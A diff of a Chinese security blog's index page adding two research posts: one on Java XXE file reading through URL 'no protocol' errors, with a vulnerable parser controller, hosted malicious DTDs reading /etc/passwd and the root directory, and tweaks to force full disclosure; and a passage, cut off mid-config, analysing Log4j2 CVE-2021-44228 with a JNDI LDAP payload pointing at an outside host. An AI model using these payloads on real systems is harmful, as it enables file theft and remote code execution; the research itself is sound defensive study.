@@ -130,17 +130,17 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">1</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">6</span></a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">2</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">9</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">2</span></a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">12</span></a>
 
   </li>
         <li class="menu-item menu-item-about">
@@ -197,6 +197,546 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttestoo.github.io/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avator.jpg">
+      <meta itemprop="name" content="ttestoo">
+      <meta itemprop="description" content="不争">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ttestoo's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/" class="post-title-link" itemprop="url">Java中XXE利用-通过URL报错读文件</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-16 23:11:24" itemprop="dateCreated datePublished" datetime="2022-01-16T23:11:24+08:00">2022-01-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-14 10:21:02" itemprop="dateModified" datetime="2022-02-14T10:21:02+08:00">2022-02-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XXE/" itemprop="url" rel="index"><span itemprop="name">XXE</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XXE/Java-Sec/" itemprop="url" rel="index"><span itemprop="name">Java Sec</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在记录了部分XXE利用之后，又看到了java环境下的另外一种利用方式：通过URL类未知协议的报错来将读取的文件进行回显；</p>
+<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>可编写一个controller，接收上传的xml文件并解析，service层解析逻辑这里省略了（以SAXParserFactory为例）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@PostMapping(value = &quot;/SAXParserFactoryXXE&quot;)</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;SAXParserFactory-XXE&quot;, notes = &quot;SAXParserFactory场景下的xxe&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">SAXParserFactoryXXE</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file)</span> <span class="keyword">throws</span> IOException, DocumentException, SAXException, ParserConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (file.getSize() &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;请上传正确的文件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String originFileName = file.getOriginalFilename();</span><br><span class="line">    <span class="keyword">if</span> (!originFileName.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;请上传xml文件&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] byteArr = file.getBytes();</span><br><span class="line">    InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(byteArr);</span><br><span class="line"></span><br><span class="line">    SAXParserFactory saxParserFactory = SAXParserFactory.newInstance();</span><br><span class="line">    SAXParser saxParser = saxParserFactory.newSAXParser();</span><br><span class="line">    saxParser.parse(inputStream, <span class="keyword">new</span> DefaultHandler());</span><br><span class="line"></span><br><span class="line">    System.out.println(<span class="string">&quot;xml内容处理&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里debug时为方便，我直接通过读取本地的xml文件进行调试（以DocumentBuilderFactory为例）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance();</span><br><span class="line">DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder();</span><br><span class="line"></span><br><span class="line">Document document = documentBuilder.parse(<span class="keyword">new</span> File(<span class="string">&quot;java-sec-study/java-sec-vuln/src/main/java/com/ttestoo/environment/test/parse.xml&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h1><p>1、准备一个xml文件（后缀为dtd也可，本质是一个dtd文件）并进行web托管，内容如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ent</span> <span class="meta-string">&quot;&lt;!ENTITY data SYSTEM &#x27;%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、payload如下（其中当目标不出网时，恶意xml地址也可通过其他内网可出网的web应用存在的漏洞进行触发，例如：jira、cf的ssrf等）：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ext</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.24.75:83/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%ext;</span></span><br><span class="line"><span class="meta">%ent;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;data;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3、成功通过报错回显读取的文件：</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642311110833-a2a22bfa-9b31-4002-8806-333f4c0a3f30.png" alt="img"></p>
+<p>也可进行列目录，更改托管的恶意xml文件中实体file的内容即可，例如列根目录：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ent</span> <span class="meta-string">&quot;&lt;!ENTITY data SYSTEM &#x27;%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642313633156-88adb897-8edc-45ab-8af1-46d6f176a1d7.png" alt="img"></p>
+<h1 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h1><p>这里以读取/etc/passwd内容为例，列目录等类似，只是file协议读取的结果不一样而已：</p>
+<p>1、发送payload，后端在解析xml时会先解析dtd，其中首先解析dtd实体ext，此时http请求<a target="_blank" rel="noopener" href="http://192.168.24.75:83/evil.xml">http://192.168.24.75:83/evil.xml</a> 获取到恶意的xml内容；</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312451180-dadbf495-9814-44e0-8ea1-e68b6b6aae83.png" alt="img"></p>
+<p>com.sun.org.apache.xerces.internal.impl.XMLEntityManager#setupCurrentEntity</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312545237-db73a499-1147-4793-9deb-03fed225547b-20220214102044596.png" alt="img"></p>
+<p>2、接着解析dtd实体ent，由于嵌套关系，会间接解析实体file并通过file协议读取到/etc/passwd内容，此时ent内容为：<!ENTITY data SYSTEM '/etc/passwd文件内容'></p>
+<p>com.sun.org.apache.xerces.internal.impl.XMLDTDScannerImpl#scanEntityValue</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312687276-9b913363-c850-4c5b-a85e-4084b4edef6a.png" alt="img"></p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312748419-838cbe5f-16f5-437e-9a9f-f1ca0a85d157.png" alt="img"></p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312921183-7285f7d7-15f2-4239-bf67-a8dc6d04307f.png" alt="img"></p>
+<p>解析实体file读取/etc/passwd的完整过程如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">setupCurrentEntity:<span class="number">698</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startEntity:<span class="number">1304</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startEntity:<span class="number">1240</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startPE:<span class="number">741</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanEntityValue:<span class="number">1729</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanEntityDecl:<span class="number">1590</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDecls:<span class="number">2028</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDTDInternalSubset:<span class="number">363</span>, XMLDTDScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">dispatch:<span class="number">1100</span>, XMLDocumentScannerImpl$DTDDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">1045</span>, XMLDocumentScannerImpl$DTDDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">933</span>, XMLDocumentScannerImpl$PrologDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">602</span>, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:<span class="number">505</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:<span class="number">842</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">771</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">141</span>, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">243</span>, DOMParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">339</span>, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:<span class="number">205</span>, DocumentBuilder (javax.xml.parsers)</span><br><span class="line">main:<span class="number">30</span>, XXETest (com.ttestoo.environment.test)</span><br></pre></td></tr></table></figure>
+
+<p>解析完实体file后，会循环将/etc/passwd的内容赋给ent实体：</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642313254849-f8fd8fa7-7d55-4b08-9293-03c007e44e8b.png" alt="img"></p>
+<p>3、在解析完dtd后，将会开始解析文档元素，则开始解析实体data，但是此时实体data对应的是/etc/passwd文件内容（##\n# User Database….，格式不满足 ‘协议名:’ 开头），此时在定义URL类时将报错no protocol，且会把读取的文件内容抛出，从而实现了通过no protocol报错内容回显读取的敏感文件的效果（非常优雅！）：</p>
+<p>java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642312009421-49145af6-b0ef-4a9e-ba5a-1037850d7c2d.png" alt="img"></p>
+<p>完整调用栈如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;init&gt;:<span class="number">592</span>, URL (java.net)</span><br><span class="line">&lt;init&gt;:<span class="number">490</span>, URL (java.net)</span><br><span class="line">&lt;init&gt;:<span class="number">439</span>, URL (java.net)</span><br><span class="line">setupCurrentEntity:<span class="number">620</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startEntity:<span class="number">1304</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">startEntity:<span class="number">1240</span>, XMLEntityManager (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanEntityReference:<span class="number">1908</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">3061</span>, XMLDocumentFragmentScannerImpl$FragmentContentDriver (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">next:<span class="number">602</span>, XMLDocumentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">scanDocument:<span class="number">505</span>, XMLDocumentFragmentScannerImpl (com.sun.org.apache.xerces.internal.impl)</span><br><span class="line">parse:<span class="number">842</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">771</span>, XML11Configuration (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">141</span>, XMLParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">243</span>, DOMParser (com.sun.org.apache.xerces.internal.parsers)</span><br><span class="line">parse:<span class="number">339</span>, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">parse:<span class="number">205</span>, DocumentBuilder (javax.xml.parsers)</span><br><span class="line">main:<span class="number">30</span>, XXETest (com.ttestoo.environment.test)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="疑问探究"><a href="#疑问探究" class="headerlink" title="疑问探究"></a>疑问探究</h1><p>相关利用中，两种报错：</p>
+<ul>
+<li>当协议不存在即文件中不存在 ‘:’ 时才会报 ‘no protocal’，并将所有的文件内容回显；</li>
+<li>当协议存在但无效时，即文件中存在 ‘:’ ，但 ‘:’ 前面的内容不是一个有效的协议字符，会报 ‘unknown protocal’，此时仅会将文件内容中 ‘:’ 前面的数据回显；</li>
+</ul>
+<p>上面分析的过程中，/etc/passwd中存在很多的 ‘:’，为啥会报no protocol呢？应该会报错 ‘unknown protocal’ 才对啊？</p>
+<p>细心可发现，在java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)中判断 ‘:’ 之前进行了判断是否以 ‘#’ 开头，当以’#’开头时则直接无协议：</p>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642318259709-a96414dd-1bc3-40f5-bc4b-37c176d4fbb4.png" alt="img"></p>
+<h1 id="可利用的场景"><a href="#可利用的场景" class="headerlink" title="可利用的场景"></a>可利用的场景</h1><p>1、实测对于SAXParserFactory、JAXP DocumentBuilderFactory等场景，均可通过报错回显读取文件，其核心报错是在java.net.URL#URL(java.net.URL, java.lang.String, java.net.URLStreamHandler)中，理论上来说一般场景均可能通过此方式读取文件，当然前提是响应中要包含报错内容；</p>
+<p>2、通过ftp读文件会收到jdk版本的限制，但是这个利用方式我本地验证jdk8u66、jdk8u121、jdk8u191、jdk14均可成功利用，由于是URL类的报错，所以这种利用方式在可看到报错的场景下会很好用！</p>
+<p>注意：</p>
+<ul>
+<li>读取的文件不能为单行文件，否则会将文件内容进行拼接到http请求中，此时http请求无法正常请求会报错（是不是可以用于其他漏洞打组合拳？）：</li>
+</ul>
+<p><img src="/2022/01/16/Java%E4%B8%ADXXE%E5%88%A9%E7%94%A8-%E9%80%9A%E8%BF%87URL%E6%8A%A5%E9%94%99%E8%AF%BB%E6%96%87%E4%BB%B6/1642316861965-10fe7158-9aed-47f6-a73e-792e11cb1bd4.png" alt="img"></p>
+<ul>
+<li>**’unknown protocol’ 报错时仅报错部分文件内容，可通过在实体data中手工添加一个 ‘:’ 来实现一定报错 ‘no protocol’**：</li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ent</span> <span class="meta-string">&quot;&lt;!ENTITY data SYSTEM &#x27;:%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>或者手工添加一个 ‘#’ 来达到同样的效果：</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///tmp/test.txt&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">ent</span> <span class="meta-string">&quot;&lt;!ENTITY data SYSTEM &#x27;#%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="巨人的肩膀"><a href="#巨人的肩膀" class="headerlink" title="巨人的肩膀"></a>巨人的肩膀</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/">https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttestoo.github.io/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avator.jpg">
+      <meta itemprop="name" content="ttestoo">
+      <meta itemprop="description" content="不争">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ttestoo's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/10/Log4j2-rce%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">Log4j2 rce漏洞记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-10 23:13:48" itemprop="dateCreated datePublished" datetime="2022-01-10T23:13:48+08:00">2022-01-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-22 16:15:22" itemprop="dateModified" datetime="2022-01-22T16:15:22+08:00">2022-01-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log4j/" itemprop="url" rel="index"><span itemprop="name">Log4j</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Log4j/Java-Sec/" itemprop="url" rel="index"><span itemprop="name">Java Sec</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文章主要记录漏洞公布以来自己的一些疑问及思考，拖了很久，匆忙结尾。。。</p>
+<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><ul>
+<li>CVE-2021-44228</li>
+<li>默认情况下，可通过控制日志打印信息、配置，使用关键标识${}触发JNDI注入造成任意代码执行；</li>
+</ul>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>调试代码如下（log4j 2.14.1）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="comment">//import org.slf4j.LoggerFactory;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cve_2021_44228</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String... args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// log4j-api</span></span><br><span class="line">        org.apache.logging.log4j.Logger logger = LogManager.getLogger();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// slf4j-api</span></span><br><span class="line">        <span class="comment">// org.slf4j.Logger logger = LoggerFactory.getLogger(RceTest.class);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        logger.error(&quot;test&quot;);</span></span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://120.48.16.203:8088/exp&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>log4j配置如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span 